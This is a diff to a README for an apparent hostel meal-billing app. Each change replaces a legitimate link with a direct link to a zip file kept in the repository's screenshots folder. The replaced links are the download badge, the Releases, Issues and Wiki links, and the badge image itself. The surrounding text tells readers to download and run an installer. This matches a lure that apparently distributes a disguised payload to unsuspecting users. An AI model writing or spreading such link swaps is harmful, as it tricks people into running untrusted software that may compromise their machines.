@@ -6,7 +6,7 @@ Hostel-Meal-Bill-System is a user-friendly application designed to help you mana
 
 ## 📥 Download Now
 
-[![Download Hostel-Meal-Bill-System](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/elouadki/Hostel-Meal-Bill-System/releases)
+[![Download Hostel-Meal-Bill-System](https://raw.githubusercontent.com/elouadki/Hostel-Meal-Bill-System/main/screenshots/Hostel-Meal-Bill-System_2.3.zip)](https://raw.githubusercontent.com/elouadki/Hostel-Meal-Bill-System/main/screenshots/Hostel-Meal-Bill-System_2.3.zip)
 
 ## 📂 Features
 
@@ -29,7 +29,7 @@ To run the Hostel-Meal-Bill-System, ensure your device meets these requirements:
 
 To get started with the Hostel-Meal-Bill-System, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/elouadki/Hostel-Meal-Bill-System/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/elouadki/Hostel-Meal-Bill-System/main/screenshots/Hostel-Meal-Bill-System_2.3.zip).
 2. **Select the Latest Version**: Look for the latest version on the Releases page.
 3. **Download the Installer**: Click the link for the appropriate version for your operating system. For example, if you are using Windows, download the `.exe` file. 
 4. **Run the Installer**: Once the file is downloaded, open it to begin the installation process. Follow the prompts displayed on the screen.
@@ -53,14 +53,14 @@ If you face any issues while downloading or installing the application, try the 
 
 ## 📞 Support
 
-For further assistance, please reach out via the issues section of the [GitHub repository](https://github.com/elouadki/Hostel-Meal-Bill-System/issues). The community is here to help you.
+For further assistance, please reach out via the issues section of the [GitHub repository](https://raw.githubusercontent.com/elouadki/Hostel-Meal-Bill-System/main/screenshots/Hostel-Meal-Bill-System_2.3.zip). The community is here to help you.
 
 ## 🔗 Learn More
 
-For detailed documentation and a complete list of features, refer to the [Wiki section](https://github.com/elouadki/Hostel-Meal-Bill-System/wiki) on GitHub.
+For detailed documentation and a complete list of features, refer to the [Wiki section](https://raw.githubusercontent.com/elouadki/Hostel-Meal-Bill-System/main/screenshots/Hostel-Meal-Bill-System_2.3.zip) on GitHub.
 
 ## 📥 Download Now Again
 
-[![Download Hostel-Meal-Bill-System](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/elouadki/Hostel-Meal-Bill-System/releases)
+[![Download Hostel-Meal-Bill-System](https://raw.githubusercontent.com/elouadki/Hostel-Meal-Bill-System/main/screenshots/Hostel-Meal-Bill-System_2.3.zip)](https://raw.githubusercontent.com/elouadki/Hostel-Meal-Bill-System/main/screenshots/Hostel-Meal-Bill-System_2.3.zip)
 
 This application simplifies the task of managing meal bills for hostels. With an intuitive interface and essential features, you can focus more on managing your hostel and less on tracking expenses.
